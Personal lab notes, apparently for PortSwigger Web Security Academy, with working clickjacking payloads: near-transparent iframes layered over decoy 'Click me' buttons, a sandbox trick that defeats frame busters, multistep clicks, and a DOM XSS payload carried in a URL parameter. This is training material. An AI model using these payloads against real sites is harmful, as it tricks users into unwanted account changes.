# Clickjacking (UI redressing)

### Overview

- Assume that the user is already logged in

- Your clickjacking element MUST have the word click in it

- Follow the instructions on each lab CAREFULLY

### Lab: Basic clickjacking with CSRF token protection

```
<style>
    iframe {
        position:relative;
        width:1000;
        height: 600;
        opacity: 0.0001;
        z-index: 2;
    }
    div {
        position:absolute;
        top:520;
        left:30;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://0ac5005003bb3155c06a20c800700051.web-security-academy.net/my-account"></iframe>
```

### Lab: Clickjacking with form input data prefilled from a URL parameter

```
<style>
    iframe {
        position:relative;
        width:1000;
        height: 650;
        opacity: 0.000005;
        z-index: 2;
    }
    div {
        position:absolute;
        top:450;
        left:70;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://0acb00d504c7e976c00c2ef400880068.web-security-academy.net/my-account?email=asd@asd.com"></iframe>
```

### Lab: Clickjacking with a frame buster script

```
<style>
    iframe {
        position:relative;
        width:1000;
        height: 650;
        opacity: 0.000000000005;
        z-index: 2;
    }
    div {
        position:absolute;
        top:475;
        left:70;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://0a7e00690477e199c07c23a000e300e5.web-security-academy.net/my-account?email=asd@asd.com" sandbox="allow-forms"></iframe>
```

### Lab: Exploiting clickjacking vulnerability to trigger DOM-based XSS

```
<style>
    iframe {
        position:relative;
        width:1000;
        height: 1000;
        opacity: 0.5;
        z-index: 2;
    }
    div {
        position:absolute;
        top:880;
        left:70;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://0a5e0079037659afc072117300640016.web-security-academy.net/feedback?name=%3Cimg%20src=%22cid:asdasdasd%22%20onerror=%22print()%22%3E&email=asd@asd.com&subject=asd&message=asd#feedbackResult"></iframe>
```

https://support.google.com/richmedia/answer/190941?hl=en#:~:text=In%20a%20URL%2C%20a%20hash,of%20the%20page%20or%20website.


### Multistep clickjacking

```
<style>
    iframe {
        position:relative;
        width:1000;
        height: 600;
        opacity: 0.5;
        z-index: 2;
    }
    div.first {
        position:absolute;
        top:510;
        left:60;
        z-index: 1;
    }
    div.second {
        position:absolute;
        top:310;
        left:200;
        z-index: 1;
    }
</style>
<div class="first">Click me first</div>
<div class="second">Click me next</div>
<iframe src="https://0af600c904cf184ac065347700da0030.web-security-academy.net/my-account"></iframe>
```





